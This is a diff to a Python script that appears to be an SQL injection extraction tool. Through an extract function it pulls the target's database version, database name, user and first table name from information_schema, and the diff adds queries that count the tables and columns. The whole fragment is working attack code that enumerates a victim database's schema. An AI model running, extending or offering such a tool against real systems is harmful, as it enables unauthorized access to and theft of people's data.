@@ -49,6 +49,7 @@ if args.key:
 query='version()'
 match=[]
 extract(key, query)
+print('')
 if match:
     print('Database version ' + max(match, key=len))
 else:
@@ -57,6 +58,7 @@ else:
 query='database()'
 match=[]
 extract(key, query)
+print('')
 if match:
     print('Database name ' + max(match, key=len))
     dbname=max(match, key=len)
@@ -66,18 +68,39 @@ else:
 query='user()'
 match=[]
 extract(key, query)
+print('')
 if match:
     print('Database username ' + max(match, key=len))
 else:
     print("Database username not found!")
-    
+
 query='(select table_name from information_schema.tables where table_schema="' + dbname + '" limit 1)'
 match=[]
 extract(key, query)
+print('')
 if match:
     print('Table name ' + max(match, key=len))
+    tbname=max(match, key=len)
 else:
     print("Table name not found!")
+
+query='(select count(*) from information_schema.tables where table_schema="' + dbname + '")'
+match=[]
+extract(key, query)
+print('')
+if match:
+    print('Number of tables in database ' + max(match, key=len))
+else:
+    print("No tables found!")
+
+query='(select count(column_name) from information_schema.columns where table_schema="' + dbname + '" and table_name="' + tbname + '")'
+match=[]
+extract(key, query)
+print('')
+if match:
+    print('Number of columns in table ' + tbname + ' ' + max(match, key=len))
+else:
+    print("No columns found!")
 
 if __name__=="__main__":
 	args=parser.parse_args()
